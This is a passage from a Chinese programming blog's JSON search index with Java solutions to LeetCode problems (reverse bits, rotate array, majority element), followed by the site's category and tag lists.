每次让数与(int)1进行与运算取出LSB并加在result上，然后将数右移一位，result左移一位，进行32次 代码 123456789101112public class Solution &#123; // you need treat n as an unsigned value public int reverseBits(int n) &#123; int res = 0; for(int i = 0; i&lt;32 ; i++)&#123; res&lt;&lt;=1; res += n&amp;1; n&gt;&gt;=1; &#125; return res; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"二进制","slug":"二进制","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"位运算","slug":"位运算","permalink":"https://virgilchen97.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"}]},{"title":"189.旋转数组","slug":"89-旋转数组","date":"2019-04-07T08:39:55.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/89-旋转数组/","link":"","permalink":"https://virgilchen97.github.io/2019/04/89-%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84/","excerpt":"给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。 例子 123456输入: [1,2,3,4,5,6,7] 和 k = 3输出: [5,6,7,1,2,3,4]解释:向右旋转 1 步: [7,1,2,3,4,5,6]向右旋转 2 步: [6,7,1,2,3,4,5]向右旋转 3 步: [5,6,7,1,2,3,4] 12345输入: [-1,-100,3,99] 和 k = 2输出: [3,99,-1,-100]解释: 向右旋转 1 步: [99,-1,-100,3]向右旋转 2 步: [3,99,-1,-100] 说明 尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。 要求使用空间复杂度为 O(1) 的原地算法。","text":"给定一个数组，将数组中的元素向右移动 k 个位置，其中 k 是非负数。 例子 123456输入: [1,2,3,4,5,6,7] 和 k = 3输出: [5,6,7,1,2,3,4]解释:向右旋转 1 步: [7,1,2,3,4,5,6]向右旋转 2 步: [6,7,1,2,3,4,5]向右旋转 3 步: [5,6,7,1,2,3,4] 12345输入: [-1,-100,3,99] 和 k = 2输出: [3,99,-1,-100]解释: 向右旋转 1 步: [99,-1,-100,3]向右旋转 2 步: [3,99,-1,-100] 说明 尽可能想出更多的解决方案，至少有三种不同的方法可以解决这个问题。 要求使用空间复杂度为 O(1) 的原地算法。 解法 1. 创建一个数组 创建一个新的数组用于存放每个元素的新位置，不满足O(1)的空间复杂度 2. 数组颠倒法 定义一个Reverse函数，其作用是反转给定的数组，将数组以 k mod length 为分界分为两部分，每个部分分别reverse，整体再reverse即可得到结果 代码 12345678910111213141516171819202122class Solution &#123; public void rotate(int[] nums, int k) &#123; if(nums.length == 1)&#123; return; &#125; k = k%nums.length; int position = nums.length - k - 1; reverse(nums,0,position); reverse(nums,position+1,nums.length-1); reverse(nums,0,nums.length-1); &#125; public void reverse(int[]nums, int l, int r)&#123; while(l&lt;r)&#123; int temp = nums[r]; nums[r] = nums[l]; nums[l] = temp; l++; r--; &#125; &#125;&#125;","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"数组","slug":"数组","permalink":"https://virgilchen97.github.io/tags/%E6%95%B0%E7%BB%84/"}]},{"title":"169.求众数","slug":"169-求众数","date":"2019-04-06T04:52:17.000Z","updated":"2022-01-26T13:48:43.537Z","comments":true,"path":"2019/04/169-求众数/","link":"","permalink":"https://virgilchen97.github.io/2019/04/169-%E6%B1%82%E4%BC%97%E6%95%B0/","excerpt":"给定一个大小为 n 的数组，找到其中的众数。众数是指在数组中出现次数大于 ⌊ n/2 ⌋ 的元素。 你可以假设数组是非空的，并且给定的数组总是存在众数。 例子 12输入: [3,2,3]输出: 3 12输入: [2,2,1,1,1,2,2]输出: 2","text":"给定一个大小为 n 的数组，找到其中的众数。众数是指在数组中出现次数大于 ⌊ n/2 ⌋ 的元素。 你可以假设数组是非空的，并且给定的数组总是存在众数。 例子 12输入: [3,2,3]输出: 3 12输入: [2,2,1,1,1,2,2]输出: 2 思路 1. 摩尔投票法 在任何数组中，出现次数大于该数组长度一半的值只能有一个。 摩尔投票法的基本思想很简单，在每一轮投票过程中，从数组中找出一对不同的元素，将其从数组中删除。这样不断的删除直到无法再进行投票，如果数组为空，则没有任何元素出现的次数超过该数组长度的一半。如果只存在一种元素，那么这个元素则可能为目标元素。 上面的操作简单化以后变为，将第一个数设置为开始的中位数，遇到相同的数Score+1，遇到不同的数Score-1，若Score变为0则将当前循环到的数设置为当前众数 代码 12345678910111213141516class Solution &#123; public int majorityElement(int[] nums) &#123; int current = 0; int score = 0; for(int i = 0; i &lt; nums.length; i++)&#123; if(score == 0) &#123; current = i; score=1; &#125;else &#123; if (nums[current] == nums[i]) score++; if (nums[current] != nums[i]) score--; &#125; &#125; return nums[current]; &#125;&#125; 复杂度 时间复杂度为 O(n) 空间复杂度为 O(1) 2. 哈希存储法 不贴具体代码了，具体思路是，扫描一遍数组，若当前元素不再哈希表里，则将元素加入表，value设置为1；若存在当前元素则value+1.最后扫描一遍哈希表，找出value大于数组长度的一半的那一项","categories":[{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"}],"tags":[{"name":"动态规划","slug":"动态规划","permalink":"https://virgilchen97.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]}],"categories":[{"name":"技术学习","slug":"技术学习","permalink":"https://virgilchen97.github.io/categories/%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"},{"name":"Linux","slug":"Linux","permalink":"https://virgilchen97.github.io/categories/Linux/"},{"name":"LeetCode","slug":"LeetCode","permalink":"https://virgilchen97.github.io/categories/LeetCode/"},{"name":"面试","slug":"面试","permalink":"https://virgilchen97.github.io/categories/%E9%9D%A2%E8%AF%95/"},{"name":"找工作","slug":"找工作","permalink":"https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"},{"name":"课程笔记","slug":"课程笔记","permalink":"https://virgilchen97.github.io/categories/%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/"},{"name":"操作系统","slug":"操作系统","permalink":"https://virgilchen97.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Netty","slug":"Netty","permalink":"https://virgilchen97.github.io/tags/Netty/"},{"name":"涨知识了","slug":"涨知识了","permalink":"https://virgilchen97.github.io/tags/%E6%B6%A8%E7%9F%A5%E8%AF%86%E4%BA%86/"},{"name":"漏洞","slug":"漏洞","permalink":"https://virgilchen97.github.io/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"实用工具类","slug":"实用工具类","permalink":"https://virgilchen97.github.io/tags/%E5%AE%9E%E7%94%A8%E5%B7%A5%E5%85%B7%E7%B1%BB/"},{"name":"Shell","slug":"Shell","permalink":"https://virgilchen97.github.io/tags/Shell/"},{"name":"优先队列","slug":"优先队列","permalink":"https://virgilchen97.github.io/tags/%E4%BC%98%E5%85%88%E9%98%9F%E5%88%97/"},{"name":"排序","slug":"排序","permalink":"https://virgilchen97.github.io/tags/%E6%8E%92%E5%BA%8F/"},{"name":"链表","slug":"链表","permalink":"https://virgilchen97.github.io/tags/%E9%93%BE%E8%A1%A8/"},{"name":"二分查找","slug":"二分查找","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"},{"name":"设计模式","slug":"设计模式","permalink":"https://virgilchen97.github.io/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"},{"name":"React","slug":"React","permalink":"https://virgilchen97.github.io/tags/React/"},{"name":"Spring","slug":"Spring","permalink":"https://virgilchen97.github.io/tags/Spring/"},{"name":"SpringBoot","slug":"SpringBoot","permalink":"https://virgilchen97.github.io/tags/SpringBoot/"},{"name":"Multi-core Concurrent Programming","slug":"Multi-core-Concurrent-Programming","permalink":"https://virgilchen97.github.io/tags/Multi-core-Concurrent-Programming/"},{"name":"栈","slug":"栈","permalink":"https://virgilchen97.github.io/tags/%E6%A0%88/"},{"name":"最小堆","slug":"最小堆","permalink":"https://virgilchen97.github.io/tags/%E6%9C%80%E5%B0%8F%E5%A0%86/"},{"name":"DFS","slug":"DFS","permalink":"https://virgilchen97.github.io/tags/DFS/"},{"name":"剪枝","slug":"剪枝","permalink":"https://virgilchen97.github.io/tags/%E5%89%AA%E6%9E%9D/"},{"name":"数据库","slug":"数据库","permalink":"https://virgilchen97.github.io/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"Java","slug":"Java","permalink":"https://virgilchen97.github.io/tags/Java/"},{"name":"位运算","slug":"位运算","permalink":"https://virgilchen97.github.io/tags/%E4%BD%8D%E8%BF%90%E7%AE%97/"},{"name":"二叉树","slug":"二叉树","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"},{"name":"排列组合","slug":"排列组合","permalink":"https://virgilchen97.github.io/tags/%E6%8E%92%E5%88%97%E7%BB%84%E5%90%88/"},{"name":"指针","slug":"指针","permalink":"https://virgilchen97.github.io/tags/%E6%8C%87%E9%92%88/"},{"name":"数学题","slug":"数学题","permalink":"https://virgilchen97.github.io/tags/%E6%95%B0%E5%AD%A6%E9%A2%98/"},{"name":"递归","slug":"递归","permalink":"https://virgilchen97.github.io/tags/%E9%80%92%E5%BD%92/"},{"name":"二进制","slug":"二进制","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"name":"线程同步","slug":"线程同步","permalink":"https://virgilchen97.github.io/tags/%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/"},{"name":"找规律","slug":"找规律","permalink":"https://virgilchen97.github.io/tags/%E6%89%BE%E8%A7%84%E5%BE%8B/"},{"name":"单链表","slug":"单链表","permalink":"https://virgilchen97.github.io/tags/%E5%8D%95%E9%93%BE%E8%A1%A8/"},{"name":"二叉搜索树","slug":"二叉搜索树","permalink":"https://virgilchen97.github.io/tags/%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91/"},{"name":"双指针","slug":"双指针","permalink":"https://virgilchen97.github.io/tags/%E5%8F%8C%E6%8C%87%E9%92%88/"},{"name":"数组","slug":"数组","permalink":"https://virgilchen97.github.io/tags/%E6%95%B0%E7%BB%84/"},{"name":"动态规划","slug":"动态规划","permalink":"https://virgilchen97.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]}